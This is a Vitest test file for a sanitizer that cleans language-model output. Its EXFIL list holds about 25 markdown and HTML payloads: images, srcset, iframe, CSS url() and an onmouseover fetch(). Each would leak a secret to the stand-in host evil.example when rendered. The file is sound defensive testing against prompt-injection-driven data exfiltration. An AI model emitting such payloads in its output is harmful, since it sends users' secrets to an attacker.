import { describe, expect, it } from 'vitest';
import { sanitizeModelOutput } from '../src/index';

/** Every one of these would make a browser fetch evil.example when rendered. */
const EXFIL: [string, string][] = [
  ['markdown image', '![x](https://evil.example/a.png?d=SECRET)'],
  ['single-quoted title', "![x](https://evil.example/a.png?d=SECRET 'title')"],
  ['parenthesised title', '![x](https://evil.example/a.png?d=SECRET (title))'],
  ['angle-bracket URL with space', '![x](<https://evil.example/a b.png?d=SECRET>)'],
  ['nested brackets in alt', '![a [b] c](https://evil.example/a.png?d=SECRET)'],
  ['newline before URL', '![x](\nhttps://evil.example/a.png?d=SECRET\n)'],
  ['protocol-relative', '![x](//evil.example/a.png?d=SECRET)'],
  ['reference image', '![x][r]\n\n[r]: https://evil.example/a.png?d=SECRET'],
  ['collapsed reference', '![r][]\n\n[r]: <https://evil.example/a.png?d=SECRET>'],
  ['shortcut reference', '![R]\n\n[r]: https://evil.example/a.png?d=SECRET "t"'],
  ['img src', '<img src="https://evil.example/x.png?d=SECRET">'],
  ['img srcset only', '<img srcset="https://evil.example/x.png?d=SECRET 1x">'],
  [
    'img src ok + srcset evil',
    '<img src="/ok.png" srcset="/ok.png 1x, https://evil.example/x?d=SECRET 2x">',
  ],
  ['video poster', '<video poster="https://evil.example/p?d=SECRET"></video>'],
  ['audio src', '<audio src="https://evil.example/p?d=SECRET" autoplay></audio>'],
  ['source src', '<picture><source srcset="https://evil.example/p?d=SECRET"></picture>'],
  ['css background', '<div style="background:url(https://evil.example/b?d=SECRET)">x</div>'],
  ['iframe', '<iframe src="https://evil.example/?d=SECRET"></iframe>'],
  ['link prefetch', '<link rel="prefetch" href="https://evil.example/?d=SECRET">'],
  ['svg image', '<svg><image href="https://evil.example/?d=SECRET"/></svg>'],
  ['unquoted attribute', '<img src=https://evil.example/x?d=SECRET>'],
  ['"<" inside attribute', '<img alt="a<b" src="https://evil.example/x?d=SECRET">'],
  ['uppercase tag', '<IMG SRC="https://evil.example/x?d=SECRET">'],
  ['newlines inside tag', '<img\nsrc="https://evil.example/x?d=SECRET"\n>'],
  ['event handler', '<b onmouseover="fetch(`https://evil.example/?d=SECRET`)">hi</b>'],
];

describe('sanitizeModelOutput — exfiltration channels are closed', () => {
  for (const mode of ['escape', 'filter'] as const) {
    it.each(EXFIL)(`[html: ${mode}] %s`, (_label, md) => {
      const r = sanitizeModelOutput(md, { html: mode });
      // After sanitising, nothing in the output may still load evil.example.
      expect(loadsRemote(r.text), r.text).toBe(false);
    });
  }
});

describe('sanitizeModelOutput — legitimate content survives', () => {
  it('keeps allowed and relative images', () => {
    const md =
      '![a](https://cdn.myapp.com/a.png "t") ![b](/local.png) ![c](<https://img.myapp.com/a b.png>)';
    expect(sanitizeModelOutput(md, { allowedImageHosts: ['*.myapp.com'] }).text).toBe(md);
  });

  it('keeps normal links and autolinks, removes script-y ones', () => {
    const r = sanitizeModelOutput(
      '[docs](https://example.com/a_(b)) <https://example.com> [x](javascript:alert(1))',
    );
    expect(r.text).toBe('[docs](https://example.com/a_(b)) <https://example.com> x');
  });

  it('does not touch code blocks or inline code', () => {
    const md = [
      'Use `<img src="https://evil.example/x">` like this:',
      '',
      '```html',
      '<img src="https://evil.example/x?d=1">',
      '![x](https://evil.example/y)',
      '```',
      '',
      '~~~',
      '<script>alert(1)</script>',
      '~~~',
    ].join('\n');
    expect(sanitizeModelOutput(md).text).toBe(md);
  });

  it('escape mode shows HTML as text, filter mode keeps safe HTML', () => {
    const md = 'Press <kbd>Ctrl</kbd> + <b>C</b>, a < b';
    expect(sanitizeModelOutput(md).text).toBe(
      'Press &lt;kbd>Ctrl&lt;/kbd> + &lt;b>C&lt;/b>, a &lt; b',
    );
    expect(sanitizeModelOutput(md, { html: 'filter' }).text).toBe(
      'Press <kbd>Ctrl</kbd> + <b>C</b>, a &lt; b',
    );
    expect(sanitizeModelOutput(md, { html: 'allow' }).text).toBe(md);
  });

  it('filter mode keeps allowed images in HTML', () => {
    const md =
      '<img src="https://cdn.myapp.com/a.png" srcset="https://cdn.myapp.com/a2.png 2x" alt="a">';
    expect(
      sanitizeModelOutput(md, { html: 'filter', allowedImageHosts: ['cdn.myapp.com'] }).text,
    ).toBe(md);
  });

  it('reports what it removed', () => {
    const r = sanitizeModelOutput(
      '![x](https://evil.example/a?d=1) <img src="https://evil.example/b">',
    );
    expect(r.removedUrls).toContain('https://evil.example/a?d=1');
    expect(r.htmlEscaped).toBe(1);
  });

  it('non-image references to external hosts are kept for links', () => {
    const md = 'See [the docs][d].\n\n[d]: https://example.com/docs';
    expect(sanitizeModelOutput(md).text).toBe(md);
  });
});

/**
 * Minimal "would this render a remote fetch" oracle: looks for any remaining
 * markdown image or HTML tag that still references evil.example outside code.
 */
function loadsRemote(text: string): boolean {
  const withoutCode = text.replace(/```[\s\S]*?```|`[^`]*`/g, '');
  // Markdown image syntax still pointing at evil (inline or via a definition)
  if (/!\[[^\]]*\]\(\s*<?[^)]*evil\.example/i.test(withoutCode)) return true;
  if (
    /!\[[^\]]*\](\[[^\]]*\])?/.test(withoutCode) &&
    /^\s*\[[^\]]+\]:\s*<?\S*evil\.example/im.test(withoutCode)
  )
    return true;
  // Any real (unescaped) HTML tag that mentions evil
  if (/<[a-z][^>]*evil\.example/i.test(withoutCode)) return true;
  return false;
}
